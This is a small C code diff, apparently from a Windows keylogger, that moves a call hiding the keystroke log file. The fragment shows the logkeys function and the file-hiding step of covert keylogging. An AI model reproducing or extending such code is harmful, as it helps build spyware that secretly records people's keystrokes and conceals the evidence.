@@ -16,8 +16,8 @@ void write_to_file(const char* log) {
     if (fptr != NULL) {
         fprintf(fptr, "%s", log);
         fclose(fptr);
-        SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
     }
+    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
 }
 
 void logkeys(const char* log) {
